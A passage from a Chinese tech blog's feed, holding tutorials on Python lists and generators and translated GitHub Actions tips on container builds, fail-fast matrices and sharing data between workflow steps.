href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      用 Rust Actix-web 写一个 Todo 应用（四）── 测试
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="Rust" scheme="https://qiwihui.com/tags/Rust/"/>
    
  </entry>
  
  <entry>
    <title>01. List — Python 进阶</title>
    <link href="https://qiwihui.com/qiwihui-blog-118/"/>
    <id>https://qiwihui.com/qiwihui-blog-118/</id>
    <published>2022-08-13T01:54:25.560Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>列表（List）是一种有序且可变的容器数据类型。 与集合（Set）不同，列表允许重复的元素。 它方便保存数据序列并对其进行进一步迭代。 列表用方括号创建。</p><span id="more"></span><p><code>my_list = [&quot;banana&quot;, &quot;cherry&quot;, &quot;apple&quot;]</code></p><h3><span id="python-zhong-ji-ben-de-nei-zhi-rong-qi-shu-ju-lei-xing-de-bi-jiao">Python中基本的内置容器数据类型的比较：</span></h3><ul><li>列表（List）是一个有序且可变的数据类型。 允许重复的成员。</li><li>元组（Tuple）是有序且不可变的数据类型。 允许重复的成员。</li><li>集合（Set）是无序和未索引的数据类型。 不允许重复的成员。</li><li>字典（Dict）是无序，可变和可索引的数据类型。 没有重复的成员。</li><li>字符串是Unicode代码的不可变序列。</li></ul><h3><span id="chuang-jian-lie-biao">创建列表</span></h3><p>列表使用方括号创建，或者内置的 list 函数。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list_1 = [<span class="string">&quot;banana&quot;</span>, <span class="string">&quot;cherry&quot;</span>, <span class="string">&quot;apple&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(list_1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或者使用 list 函数创建空列表</span></span><br><span class="line">list_2 = <span class="built_in">list</span>()</span><br><span class="line"><span class="built_in">print</span>(list_2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列表允许不同的数据类</span></span><br><span class="line">list_3 = [<span class="number">5</span>, <span class="literal">True</span>, <span class="string">&quot;apple&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(list_3)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列表允许重复元素</span></span><br><span class="line">list_4 = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(list_4)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;banana&#x27;</span>, <span class="string">&#x27;cherry&#x27;</span>, <span class="string">&#x27;apple&#x27;</span>]</span><br><span class="line">[]</span><br><span class="line">[<span class="number">5</span>, <span class="literal">True</span>, <span class="string">&#x27;apple&#x27;</span>]</span><br><span class="line">[<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>]</span><br></pre></td></tr></table></figure><h3><span id="fang-wen-yuan-su">访问元素</span></h3><p>可以通过索引号访问列表项。 请注意，索引从0开始。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">item = list_1[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(item)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 你也可以使用负索引，比如 -1 表示最后一个元素，</span></span><br><span class="line"><span class="comment"># -2 表示倒数第二个元素，以此类推</span></span><br><span class="line">item = list_1[-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(item)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">banana</span><br><span class="line">apple</span><br></pre></td></tr></table></figure><h3><span id="xiu-gai-yuan-su">修改元素</span></h3><p>只需访问索引并分配一个新值即可。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 列表创建之后可以被修改</span></span><br><span class="line">list_1[<span class="number">2</span>] = <span class="string">&quot;lemon&quot;</span></span><br><span class="line"><span class="built_in">print</span>(list_1)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;banana&#x27;</span>, <span class="string">&#x27;cherry&#x27;</span>, <span class="string">&#x27;lemon&#x27;</span>]</span><br></pre></td></tr></table></figure><h3><span id="you-yong-de-fang-fa">有用的方法</span></h3><p>查看Python文档以查看所有列表方法：<a href="https://docs.python.org/3/tutorial/datastructures.html">https://docs.python.org/3/tutorial/datastructures.html</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_list = [<span class="string">&quot;banana&quot;</span>, <span class="string">&quot;cherry&quot;</span>, <span class="string">&quot;apple&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># len() : 获取列表的元素个数</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Length:&quot;</span>, <span class="built_in">len</span>(my_list))</span><br><span class="line"></span><br><span class="line"><span class="comment"># append() : 添加一个元素到列表末尾</span></span><br><span class="line">my_list.append(<span class="string">&quot;orange&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># insert() : 添加元素到特定位置</span></span><br><span class="line">my_list.insert(<span class="number">1</span>, <span class="string">&quot;blueberry&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(my_list)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pop() : 移除并返回特定位置的元素，默认为最后一个</span></span><br><span class="line">item = my_list.pop()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Popped item: &quot;</span>, item)</span><br><span class="line"></span><br><span class="line"><span class="comment"># remove() : 移除列表中的元素</span></span><br><span class="line">my_list.remove(<span class="string">&quot;cherry&quot;</span>) <span class="comment"># 如果元素没有在列表中，则触发 Value error</span></span><br><span class="line"><span class="built_in">print</span>(my_list)</span><br><span class="line"></span><br><span class="line"><span class="comment"># clear() : 移除列表所有元素</span></span><br><span class="line">my_list.clear()</span><br><span class="line"><span class="built_in">print</span>(my_list)</span><br><span class="line"></span><br><span class="line"><span class="comment"># reverse() : 翻转列表</span></span><br><span class="line">my_list = [<span class="string">&quot;banana&quot;</span>, <span class="string">&quot;cherry&quot;</span>, <span class="string">&quot;apple&quot;</span>]</span><br><span class="line">my_list.reverse()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Reversed: &#x27;</span>, my_list)</span><br><span class="line"></span><br><span class="line"><span class="comment"># sort() : 升序排列元素</span></span><br><span class="line">my_list.sort()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Sorted: &#x27;</span>, my_list)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 sorted() 得到一个新列表，原来的列表不受影响</span></span><br><span class="line"><span class="comment"># sorted() 对任何可迭代类型起作用，不只是列表</span></span><br><span class="line">my_list = [<span class="string">&quot;banana&quot;</span>, <span class="string">&quot;cherry&quot;</span>, <span class="string">&quot;apple&quot;</span>]</span><br><span class="line">new_list = <span class="built_in">sorted</span>(my_list)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建具有重复元素的列表</span></span><br><span class="line">list_with_zeros = [<span class="number">0</span>] * <span class="number">5</span></span><br><span class="line"><span class="built_in">print</span>(list_with_zeros)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列表拼接</span></span><br><span class="line">list_concat = list_with_zeros + my_list</span><br><span class="line"><span class="built_in">print</span>(list_concat)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 字符串转列表</span></span><br><span class="line">string_to_list = <span class="built_in">list</span>(<span class="string">&#x27;Hello&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(string_to_list)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Length: <span class="number">3</span></span><br><span class="line">[<span class="string">&#x27;banana&#x27;</span>, <span class="string">&#x27;blueberry&#x27;</span>, <span class="string">&#x27;cherry&#x27;</span>, <span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;orange&#x27;</span>]</span><br><span class="line">Popped item:  orange</span><br><span class="line">[<span class="string">&#x27;banana&#x27;</span>, <span class="string">&#x27;blueberry&#x27;</span>, <span class="string">&#x27;apple&#x27;</span>]</span><br><span class="line">[]</span><br><span class="line">Reversed:  [<span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;cherry&#x27;</span>, <span class="string">&#x27;banana&#x27;</span>]</span><br><span class="line">Sorted:  [<span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;banana&#x27;</span>, <span class="string">&#x27;cherry&#x27;</span>]</span><br><span class="line">[<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">[<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="string">&#x27;banana&#x27;</span>, <span class="string">&#x27;cherry&#x27;</span>, <span class="string">&#x27;apple&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;o&#x27;</span>]</span><br></pre></td></tr></table></figure><h3><span id="fu-zhi-lie-biao">复制列表</span></h3><p>复制引用（references）时要小心。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list_org = [<span class="string">&quot;banana&quot;</span>, <span class="string">&quot;cherry&quot;</span>, <span class="string">&quot;apple&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这只是将引用复制到列表中，要小心</span></span><br><span class="line">list_copy = list_org</span><br><span class="line"></span><br><span class="line"><span class="comment"># 现在，修改复制的列表也会影响原来的列表</span></span><br><span class="line">list_copy.append(<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(list_copy)</span><br><span class="line"><span class="built_in">print</span>(list_org)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 copy(), 或者 list(x) 来真正复制列表</span></span><br><span class="line"><span class="comment"># 切片（slicing）也可以复制：list_copy = list_org[:]</span></span><br><span class="line">list_org = [<span class="string">&quot;banana&quot;</span>, <span class="string">&quot;cherry&quot;</span>, <span class="string">&quot;apple&quot;</span>]</span><br><span class="line"></span><br><span class="line">list_copy = list_org.copy()</span><br><span class="line"><span class="comment"># list_copy = list(list_org)</span></span><br><span class="line"><span class="comment"># list_copy = list_org[:]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 现在，修改复制的列表不会影响原来的列表</span></span><br><span class="line">list_copy.append(<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(list_copy)</span><br><span class="line"><span class="built_in">print</span>(list_org)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;banana&#x27;</span>, <span class="string">&#x27;cherry&#x27;</span>, <span class="string">&#x27;apple&#x27;</span>, <span class="literal">True</span>]</span><br><span class="line">[<span class="string">&#x27;banana&#x27;</span>, <span class="string">&#x27;cherry&#x27;</span>, <span class="string">&#x27;apple&#x27;</span>, <span class="literal">True</span>]</span><br><span class="line">[<span class="string">&#x27;banana&#x27;</span>, <span class="string">&#x27;cherry&#x27;</span>, <span class="string">&#x27;apple&#x27;</span>, <span class="literal">True</span>]</span><br><span class="line">[<span class="string">&#x27;banana&#x27;</span>, <span class="string">&#x27;cherry&#x27;</span>, <span class="string">&#x27;apple&#x27;</span>]</span><br></pre></td></tr></table></figure><h3><span id="die-dai">迭代</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用for循环迭代列表</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list_1:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">banana</span><br><span class="line">cherry</span><br><span class="line">lemon</span><br></pre></td></tr></table></figure><h3><span id="jian-cha-yuan-su-shi-fou-cun-zai">检查元素是否存在</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">&quot;banana&quot;</span> <span class="keyword">in</span> list_1:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;yes&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;no&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">yes</span><br></pre></td></tr></table></figure><h3><span id="qie-pian">切片</span></h3><p>和字符串一样，使用冒号（ <code>:</code>）访问列表的子部分。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># a[start:stop:step], 默认步长为 1</span></span><br><span class="line">a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>]</span><br><span class="line">b = a[<span class="number">1</span>:<span class="number">3</span>] <span class="comment"># 主语，最后一个索引不包括</span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line">b = a[<span class="number">2</span>:] <span class="comment"># 知道最后</span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line">b = a[:<span class="number">3</span>] <span class="comment"># 从第一个元素开始</span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line">a[<span class="number">0</span>:<span class="number">3</span>] = [<span class="number">0</span>] <span class="comment"># 替换子部分，需要可迭代</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">b = a[::<span class="number">2</span>] <span class="comment"># 从头到为每隔两个元素</span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line">a = a[::-<span class="number">1</span>] <span class="comment"># 使用负步长翻转列表</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">b = a[:] <span class="comment"># 使用切片复制元素</span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[<span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">[<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>]</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">[<span class="number">0</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>]</span><br><span class="line">[<span class="number">0</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>]</span><br><span class="line">[<span class="number">10</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">0</span>]</span><br><span class="line">[<span class="number">10</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">0</span>]</span><br></pre></td></tr></table></figure><h3><span id="lie-biao-tui-dao">列表推导</span></h3><p>一种从现有列表创建新列表的简便快捷方法。</p><p>列表推导方括号内包含一个表达式，后跟for语句。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>]</span><br><span class="line">b = [i * i <span class="keyword">for</span> i <span class="keyword">in</span> a] <span class="comment"># 每个元素平方</span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">25</span>, <span class="number">36</span>, <span class="number">49</span>, <span class="number">64</span>]</span><br></pre></td></tr></table></figure><p>嵌套列表</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [[<span class="number">1</span>, <span class="number">2</span>], [<span class="number">3</span>, <span class="number">4</span>]]</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(a[<span class="number">0</span>])</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[[<span class="number">1</span>, <span class="number">2</span>], [<span class="number">3</span>, <span class="number">4</span>]]</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>]</span><br></pre></td></tr></table></figure><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      01. List — Python 进阶
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="Python" scheme="https://qiwihui.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>GitHub Actions 第5天：在容器中构建</title>
    <link href="https://qiwihui.com/qiwihui-blog-88/"/>
    <id>https://qiwihui.com/qiwihui-blog-88/</id>
    <published>2022-08-13T01:54:25.560Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<p>昨天我讨论了如何 <a href="https://qiwihui.com/qiwihui-blog-87/">在GitHub Actions虚拟环境上安装工具和依赖项</a>。 但是，如果你需要更多控制权怎么办？ 或者，如果你根本不想在 Ubuntu 上运行，该怎么办？ 这是容器发光的地方。</p><p>通过创建一个包含所有需要的开发工具以及项目依赖项的容器，你不必操心在工作流运行开始时就对那些设置和安装步骤进行管理。</p><p>此外，你还将获得基于容器的开发的优势：你可以在用于CI构建的同一个容器中进行本地构建，因此你可以高度自信地确保 GitHub Actions 中的构建与构建时所看到的与本地匹配。</p><p>语法非常简单明了──我不需要自己运行任何 <code>docker pull</code> 或 <code>docker run</code> 命令。 GitHub Actions 为我解决了这个问题。要获取源代码并在 <code>node：current</code> 容器中运行测试，请执行以下操作：</p><span id="more"></span><script src="https://gist.github.com/ethomson/d56f1804295ee1a4779a0d013ec4572b.js"></script><p>当我运行此工作流时，GitHub Actions 将从 DockerHub 下载我指定的容器，启动它，然后直接在该容器中执行我指定的运行步骤。</p><blockquote><p>请注意，在容器内运行时，仍然需要指定运行对象。这是因为 Linux 和 Windows 都支持容器──因此，如果你要运行基于 Linux 的容器，则需要 <code>runs-on: ubuntu-latest</code>。 如果要使用基于Windows的容器，请确保设置 <code>runs-on: windows-latest</code>。</p></blockquote><p>容器还可以帮助扩展构建矩阵：如果要跨多个 Linux 发行版构建和测试工具，则甚至可以在矩阵中设置容器作业。（因为 <a href="https://www.edwardthomson.com/blog/github_actions_2_matrixes.html">矩阵工作流实际上只是可变的替代</a>。）</p><p>例如，要在 Debian，Ubuntu 和 CentOS 的旧版和最新版本上构建：</p><script src="https://gist.github.com/ethomson/46a2db40d5c1d320fcc79886320f375e.js"></script><p>因此，无论你是要直接在我们提供的虚拟环境中还是在你指定的容器中构建，你都可以灵活地选择工作流的运行位置。</p><p>原文链接：<a href="https://www.edwardthomson.com/blog/github_actions_5_building_in_containers.html">https://www.edwardthomson.com/blog/github_actions_5_building_in_containers.html</a></p><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      GitHub Actions 第5天：在容器中构建
    
    </summary>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="翻译" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
      <category term="tips" scheme="https://qiwihui.com/tags/tips/"/>
    
      <category term="github actions" scheme="https://qiwihui.com/tags/github-actions/"/>
    
  </entry>
  
  <entry>
    <title>GitHub Actions 第6天：快速失败的矩阵工作流</title>
    <link href="https://qiwihui.com/qiwihui-blog-89/"/>
    <id>https://qiwihui.com/qiwihui-blog-89/</id>
    <published>2022-08-13T01:54:25.560Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<p>因此，关于 GitHub Actions 的这些帖子甚至还不到一周，我已经写了很多有关 <a href="https://qiwihui.com/qiwihui-blog-85/">矩阵工作流</a> 的文章。如你还没猜到，我是忠实粉丝。 😍</p><p>但是，如果你开始设置第一个矩阵工作流程，那么你需要注意：默认情况下，矩阵工作流程会<a href="https://help.github.com/en/actions/automating-your-workflow-with-github-actions/workflow-syntax-for-github-actions#jobsjob_idstrategyfail-fast">快速失败</a>。这就是说：如果矩阵扩展中的一个作业失败，则其余作业将被取消。</p><p>这种行为通常非常有益：如果你正在运行 pull request 验证构建，而矩阵中的构建之一失败，则你可能根本不在乎其余的构建是否成功。任何失败都足以表明存在使你无法合并 PR 的问题。</p><span id="more"></span><p>但是，当你从头开始创建工作流时，可能需要迭代一下才能使其第一次正常工作。当作业失败是由于工作流设置中存在问题而不是代码本身存在问题时，关闭快速故障行为作为调试工具会很有帮助。</p><p>假设你有一个在 Linux 上运行良好的工作流程，并且希望使用矩阵将其扩展到可以在 macOS 和 Windows 上运行。对于简单的工作流程，这可能会正常工作。但是对于更复杂的事情，你可能需要先设置一些依赖项或安装一些工具，然后才能起作用。因此，很可能你的Linux上运行的工作流如果不做一些修改就无法在 macOS 或 Windows 上运行。</p><p>那么，当你第一次运行此新矩阵工作流时会发生什么？你的 Linux，macOS 和 Windows 作业将全部启动，并且 macOS 作业或 Windows 作业将失败，其余工作流程将被取消。</p><p>想象一下，首先失败的是 Windows 作业。你会看到的：</p><p><img src="https://user-images.githubusercontent.com/3297411/77217607-b9693880-6b5e-11ea-91df-11d70a9388f1.png" alt="image"></p><p>好的，因此你决定需要修复 Windows 工作流程。 因此，你可以查看出了什么问题，更新工作流程，然后推送更改以将新构建放入队列。 但是，由于排队和调度不是很确定，因此也许这次 macOS 构建首先完成──失败。 现在，你的 Windows 运行被取消，甚至无法找出它是否有效：</p><p><img src="https://user-images.githubusercontent.com/3297411/77217652-0220f180-6b5f-11ea-99bb-0bcf357f6db1.png" alt="image"></p><p>现在，在调试工作流时，可以通过设置 <code>fail-fast: false</code> 来关闭此行为：</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">strategy:</span></span><br><span class="line">  <span class="attr">matrix:</span></span><br><span class="line">    <span class="attr">os:</span> [<span class="string">ubuntu-latest</span>, <span class="string">macos-latest</span>, <span class="string">windows-latest</span>]</span><br><span class="line">  <span class="attr">fail-fast:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure><p>现在，工作流不会在第一个失败的作业时被取消。它将允许 Windows 和 macOS 作业运行完成。</p><p><img src="https://user-images.githubusercontent.com/3297411/77217688-48765080-6b5f-11ea-9fad-063aecf682f5.png" alt="image"></p><p>关闭 <code>fail-fast</code> 将帮助你更轻松地迭代工作流程。准备好在生产中运行时，请务必将其重新打开！这将帮助你节省CI运行时间（和金钱）。</p><p>原文链接：<a href="https://www.edwardthomson.com/blog/github_actions_6_fail_fast_matrix_workflows.html">https://www.edwardthomson.com/blog/github_actions_6_fail_fast_matrix_workflows.html</a></p><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      GitHub Actions 第6天：快速失败的矩阵工作流
    
    </summary>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="翻译" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
      <category term="tips" scheme="https://qiwihui.com/tags/tips/"/>
    
      <category term="github actions" scheme="https://qiwihui.com/tags/github-actions/"/>
    
  </entry>
  
  <entry>
    <title>GitHub Actions 第15天：在步骤之间共享数据</title>
    <link href="https://qiwihui.com/qiwihui-blog-98/"/>
    <id>https://qiwihui.com/qiwihui-blog-98/</id>
    <published>2022-08-13T01:54:25.560Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<p>在 GitHub Actions 的任务中，你可以有多个步骤 ，一个接一个地运行。每个步骤可能是调用一个操作（例如，<a href="https://github.com/actions/checkout">检出存储库中的代码</a>或<a href="https://github.com/actions/setup-node">安装特定版本的Node.js</a>），也可能是一个 <code>run</code>，仅运行你提供的脚本的步骤。</p><p>但是通常你希望与之前执行的步骤进行交互，例如，你可能希望运行一个步骤来更新软件的版本号，以使其准备好发布。然后，你可能需要在实际的发布步骤中使用该版本号。</p><span id="more"></span><p>但是，如何来回获取这些数据？GitHub Actions在其自己的流程中运行你的每个步骤。这意味着你不能只在一个步骤中设置环境变量，然后在另一步骤中引用它。换句话说，这将无法正常工作：</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">steps:</span></span><br><span class="line">  <span class="comment"># 这将 **无效**。这两个 `run` 步骤被编写为</span></span><br><span class="line">  <span class="comment"># 作为不同的脚本并由不同的shell运行，因此</span></span><br><span class="line">  <span class="comment"># `FOO` 变量将不会在它们之间持久存在。</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">run:</span> <span class="string">export</span> <span class="string">FOO=bar</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">run:</span> <span class="string">echo</span> <span class="string">$FOO</span></span><br></pre></td></tr></table></figure><p>但是，GitHub Actions 确实为你提供了将数据持久保存在执行环境中的工具。你可以通过写入标准输出（即，仅使用echo）来向GitHub Actions编写命令──包括指示 GitHub Actions 在后续运行步骤中<a href="https://github.com/actions/setup-node">设置环境变量的命令</a>。</p><p>在当前shell中设置环境变量之后，可以对GitHub Actions 使用命令 <code>set-env</code> ，这将是环境变量被注入到以后的步骤中：</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">steps:</span></span><br><span class="line">  <span class="comment"># 这将会在第一个 `run` 脚本中设置 `FOO` 环境变量。</span></span><br><span class="line">  <span class="comment"># 然后指示 GitHub Actions 在随后的运行步骤中使其可用。</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">      export FOO=bar</span></span><br><span class="line"><span class="string">      echo &quot;::set-env name=FOO::$FOO&quot;</span></span><br><span class="line"><span class="string"></span>  <span class="bullet">-</span> <span class="attr">run:</span> <span class="string">echo</span> <span class="string">$FOO</span></span><br></pre></td></tr></table></figure><p>现在，实际上可以在后续步骤中获取环境变量 <code>FOO</code> 中的数据。</p><p><img src="https://user-images.githubusercontent.com/3297411/77851728-322a5d80-720d-11ea-8a61-43a2b1c99549.png" alt="image"></p><p>GitHub Actions将这些步骤作为单独的脚本运行──这意味着在单独的Shell调用中运行并每次都获得原始环境。但是，使用GitHub Actions平台内的开发工具，你可以在调用之间共享数据。</p><p>原文链接：<a href="https://www.edwardthomson.com/blog/github_actions_15_sharing_data_between_steps.html">https://www.edwardthomson.com/blog/github_actions_15_sharing_data_between_steps.html</a></p><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      GitHub Actions 第15天：在步骤之间共享数据
    
    </summary>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="翻译" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
      <category term="tips" scheme="https://qiwihui.com/tags/tips/"/>
    
      <category term="github actions" scheme="https://qiwihui.com/tags/github-actions/"/>
    
  </entry>
  
  <entry>
    <title>14. 生成器 — Python 进阶</title>
    <link href="https://qiwihui.com/qiwihui-blog-128/"/>
    <id>https://qiwihui.com/qiwihui-blog-128/</id>
    <published>2022-08-13T01:54:25.550Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<p>生成器是可以在运行中暂停和恢复的函数，返回可以迭代的对象。 与列表不同，它们是懒惰的，因此一次仅在被询问时才产生一项。 因此，在处理大型数据集时，它们的内存效率更高。</p><p>生成器的定义类似于普通函数，但是使用 <code>yield</code> 语句而不是 <code>return</code>。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">my_generator</span>():</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">2</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">3</span></span><br></pre></td></tr></table></figure><span id="more"></span><h3><span id="zhi-xing-sheng-cheng-qi-han-shu">执行生成器函数</span></h3><p>调用该函数不会执行它，而是函数返回一个生成器对象，该对象用于控制执行。 生成器对象在调用 <code>next()</code> 时执行。 首次调用 <code>next()</code> 时，执行从函数的开头开始，一直持续到第一个 <code>yield</code> 语句，在该语句中返回语句右边的值。 随后对 <code>next()</code> 的调用从 <code>yield</code> 语句继续（并循环），直到达到另一个 <code>yield</code>。 如果由于条件而未调用 <code>yield</code> 或到达末尾，则会引发 <code>StopIteration</code> 异常：</p><figure class="highlight python"><table><tr><td class="code"><pre><span 